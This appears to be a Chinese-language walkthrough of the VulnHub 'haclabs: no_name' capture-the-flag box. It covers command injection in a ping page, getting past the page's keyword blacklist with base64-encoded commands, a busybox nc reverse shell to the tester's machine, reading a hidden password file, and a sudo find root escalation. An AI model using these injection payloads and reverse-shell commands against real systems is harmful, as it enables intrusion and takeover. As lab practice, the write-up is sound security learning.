# haclabs: no_name

2024-5-27 https://www.vulnhub.com/entry/haclabs-no_name,429/

difficulty: Beginner/intermediate

## IP

192.168.5.29

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

gobuster 得到 2 个页面链接：

```
http://192.168.5.29/index.php
http://192.168.5.29/admin
```

/admin 打不开。

/index.php 是一个提交内容页面，输入框中输入一个字符，显示 fake ping execute，应该是后台在做 ping 操作，这里可能存在 RCE。但是经过测试，发现不能执行命令，是个假的 ping。

换一个其他的字典，看看能不能找到其他页面：

```
gobuster -t 64 dir -u http://192.168.5.29/ -k -w /usr/share/wordlists/dirb/big.txt -x php,txt,html -e
```

发现 http://192.168.5.29/superadmin.php 显示了一个 ping 窗口，这时输入 127.0.0.1 发现显示了 ping 的操作，这里就可以执行反弹的命令,kali 上监听 8888 端口：

```
127.0.0.1|id
```

能够显示 www-data，换成其他的命令，发现不能反弹，应该是目标系统上有防护，对特定关键词进行了过滤。

尝试读取 superadmin.php 的源码：

```
curl --data-urlencode "pinger=127.0.0.1|cat superadmin.php" --data-urlencode "submitt=%E6%8F%90%E4%BA%A4"  http://192.168.5.29/superadmin.php

<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```

如果 pinger 中有 word 中的关键词，验证就不通过。可以利用 base64 编码进行绕过：

```
POST /superadmin.php HTTP/1.1
Host: 192.168.5.29
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Origin: http://192.168.5.29
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.5.29/superadmin.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

pinger=127.0.0.1|`echo%20bHMgLWFs|base64%20-d`&submitt=%E6%8F%90%E4%BA%A4
```

ls -al 经过 base64 编码为 bHMgLWFs，可以看到所有的文件：

```
total 6132
drwxr-xr-x 2 root root    4096 Jan 30  2020 .
drwxr-xr-x 3 root root    4096 Jan 27  2020 ..
-rw-r--r-- 1 root root 1019381 Dec 27  2019 Short.png
-rw-r--r-- 1 root root     417 Jan 27  2020 admin
-rw-r--r-- 1 root root 1303340 Jan  8  2020 ctf-01.jpg
-rw-r--r-- 1 root root   10486 Jan 30  2020 haclabs.jpeg
-rw-r--r-- 1 root root     279 Jan 30  2020 index.php
-rw-r--r-- 1 root root 3919716 Dec 30  2019 new.jpg
-rw-r--r-- 1 root root     523 Jan 30  2020 superadmin.php
```

将 nc 的反弹命令经过 base64 编码：

```
busybox   nc 192.168.5.3 8888 -e /bin/bash

YnVzeWJveCAgIG5jIDE5Mi4xNjguNS4zIDg4ODggLWUgL2Jpbi9iYXNo

pinger=127.0.0.1|`echo%20YnVzeWJveCAgIG5jIDE5Mi4xNjguNS4zIDg4ODggLWUgL2Jpbi9iYXNo|base64%20-d`&submitt=%E6%8F%90%E4%BA%A4
```

得到反弹 shell 后，先升级 tty，查看 /etc/passwd 找到存在用户：

```
www-data@haclabs:/var/www/html$ cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
haclabs:x:1000:1000:haclabs,,,:/home/haclabs:/bin/bash
yash:x:1001:1001:,,,:/home/yash:/bin/bash
```

得到 flag1 的提示：

```
www-data@haclabs:/home/yash$ cat flag1.txt
Due to some security issues,I have saved haclabs password in a hidden file.
```

经过寻找，发现文件 /usr/share/hidden/.passwd:

```
www-data@haclabs:/home/haclabs$ cat /usr/share/hidden/.passwd
haclabs1234
```

su 切换到 haclabs,得到 flag2：

```
www-data@haclabs:/home/haclabs$ cat flag2.txt
I am flag2

	   ---------------               ----------------


                               --------
```

sudo 发现：

```
(root) NOPASSWD: /usr/bin/find
```

利用 sudo find 获得 root 权限：

```
haclabs@haclabs:~$ sudo -u root find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag3.txt
# cat flag3.txt
Congrats!!!You completed the challenege!



						   ()    ()

						 \	    /
						  ----------
```
